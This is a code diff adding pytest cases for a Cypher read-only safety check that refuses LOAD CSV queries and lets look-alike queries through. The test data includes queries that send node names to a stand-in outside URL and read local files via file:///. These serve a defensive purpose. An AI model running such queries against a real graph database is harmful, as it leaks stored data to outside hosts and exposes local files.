@@ -9,7 +9,7 @@ from __future__ import annotations
 
 import pytest
 
-from ai.common.graph.cypher_safety import CypherRefused, check_read_only_cypher
+from ai.common.graph.cypher_safety import CypherRefused, check_read_only_cypher, check_read_query_statement
 from ai.common.graph.graph_errors import GraphToolError
 
 READS = [
@@ -124,3 +124,47 @@ def test_custom_allowlist():
     check_read_only_cypher('CALL my.proc()', allowed_procedures=frozenset({'my.proc'}))
     with pytest.raises(CypherRefused):
         check_read_only_cypher('CALL db.labels()', allowed_procedures=frozenset({'my.proc'}))
+
+
+# ---------------------------------------------------------------------------
+# check_read_query_statement: the rule every driver's read_query applies
+# ---------------------------------------------------------------------------
+
+LOAD_CSV = [
+    "LOAD CSV FROM 'https://example.invalid/x.csv' AS row RETURN row",
+    'load csv with headers from $url as row return row',
+    "MATCH (n) WITH 'https://example.invalid/?q=' + n.name AS u LOAD CSV FROM u AS row RETURN count(row)",
+    "LOAD /* comment */ CSV FROM 'file:///x' AS r RETURN r",
+    "CALL { LOAD CSV FROM 'file:///x' AS r RETURN r } RETURN 1",
+]
+
+NOT_LOAD_CSV = [
+    'MATCH (n:Load) RETURN n.csv',
+    'MATCH (n) RETURN n.load, n.LOAD',
+    "RETURN 'LOAD CSV FROM x' AS s",
+    'MATCH (load) RETURN load',
+    'WITH 1 AS load RETURN load',
+    'MATCH (n {load: 1}) RETURN n',
+    'MATCH (n) RETURN `LOAD` AS csv',
+    'MATCH (n) // LOAD CSV FROM x\nRETURN n',
+    # Procedures and writes are each driver's own read boundary, not this check.
+    'CALL db.labels()',
+    'MATCH (n) SET n.x = 1',
+]
+
+
+@pytest.mark.parametrize('cypher', LOAD_CSV)
+def test_read_query_statement_refuses_load_csv(cypher):
+    with pytest.raises(CypherRefused) as err:
+        check_read_query_statement(cypher)
+    assert err.value.headline == 'Refused: LOAD CSV is not allowed on the read-only path'
+
+
+@pytest.mark.parametrize('cypher', NOT_LOAD_CSV)
+def test_read_query_statement_passes_everything_else(cypher):
+    check_read_query_statement(cypher)
+
+
+def test_read_query_statement_refuses_unterminated_text():
+    with pytest.raises(CypherRefused, match='unterminated'):
+        check_read_query_statement("MATCH (n) WHERE n.x = 'open")
